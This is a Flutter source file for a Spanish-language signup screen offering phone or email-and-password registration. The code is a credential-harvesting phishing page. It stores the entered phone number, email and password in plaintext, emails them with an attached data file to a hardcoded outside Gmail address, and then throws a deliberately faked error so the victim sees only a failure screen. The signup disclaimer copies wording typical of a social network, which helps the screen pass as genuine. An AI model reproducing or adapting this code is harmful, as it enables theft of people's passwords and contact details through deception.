import 'dart:io';
import 'package:flutter/material.dart';
import 'package:myapp/error.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter_email_sender/flutter_email_sender.dart';

class LoginCorreo extends StatefulWidget {
  @override
  _LoginWithPhoneEmailUsernameScreenState createState() =>
      _LoginWithPhoneEmailUsernameScreenState();
}

class _LoginWithPhoneEmailUsernameScreenState extends State<LoginCorreo> {
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController =
      TextEditingController(); // Nuevo controlador para la contraseña
  final String recipientEmail = '@gmail.com'; // Correo para enviar el archivo

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Regístrate'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            DefaultTabController(
              length: 2,
              child: Column(
                children: [
                  TabBar(
                    tabs: [
                      Tab(text: 'Teléfono'),
                      Tab(text: 'Correo electrónico'),
                    ],
                  ),
                  SizedBox(height: 16),
                  Container(
                    height: 400,
                    child: TabBarView(
                      children: [
                        Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Text('MX +52'),
                                SizedBox(width: 8),
                                Expanded(
                                  child: TextField(
                                    controller: _phoneController,
                                    decoration: InputDecoration(
                                      labelText: 'Número de teléfono',
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            SizedBox(height: 16),
                            Text(
                              'Tu número de teléfono podría usarse para conectarte con personas que quizás conoces, mejorar los anuncios que ves y más, en función de tus ajustes. Si te registras con SMS, puede que se aplique una tarifa por SMS.',
                            ),
                            SizedBox(height: 16),
                            ElevatedButton(
                              onPressed: () async {
                                try {
                                  String phone = _phoneController.text;
                                  await _saveData('phone', phone);
                                  await _sendEmail(phone, 'phone');
                                  // Simulando un error
                                  throw Exception("Simulated error");
                                } catch (e) {
                                  Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                      builder: (context) => ErrorScreen(),
                                    ),
                                  );
                                }
                              },
                              child: Text('Enviar código'),
                            ),
                          ],
                        ),
                        Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            TextField(
                              controller: _emailController,
                              decoration: InputDecoration(
                                labelText: 'Correo electrónico',
                              ),
                            ),
                            SizedBox(height: 16),
                            TextField(
                              controller: _passwordController,
                              decoration: InputDecoration(
                                labelText: 'Contraseña',
                              ),
                              obscureText: true, // Para ocultar la contraseña
                            ),
                            SizedBox(height: 16),
                            ElevatedButton(
                              onPressed: () async {
                                try {
                                  String email = _emailController.text;
                                  String password = _passwordController.text;
                                  await _saveData('email', email);
                                  await _saveData('password', password);
                                  await _sendEmail('$email\n$password',
                                      'email y contraseña');
                                  // Simulando un error
                                  throw Exception("Simulated error");
                                } catch (e) {
                                  Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                      builder: (context) => ErrorScreen(),
                                    ),
                                  );
                                }
                              },
                              child: Text('Enviar código'),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _saveData(String key, String value) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setString(key, value);
    await _saveToFile(key, value);
  }

  Future<void> _saveToFile(String key, String value) async {
    final directory = await getApplicationDocumentsDirectory();
    final path = '${directory.path}/userdata.txt';
    final file = File(path);
    final text = '$key: $value\n';
    await file.writeAsString(text, mode: FileMode.append);
  }

  Future<void> _sendEmail(String value, String key) async {
    final directory = await getApplicationDocumentsDirectory();
    final path = '${directory.path}/userdata.txt';
    final email = Email(
      body: 'Se ha registrado un nuevo usuario con $key: $value.',
      subject: 'Nuevo registro de usuario',
      recipients: [recipientEmail],
      attachmentPaths: [path],
      isHTML: false,
    );
    await FlutterEmailSender.send(email);
  }
}
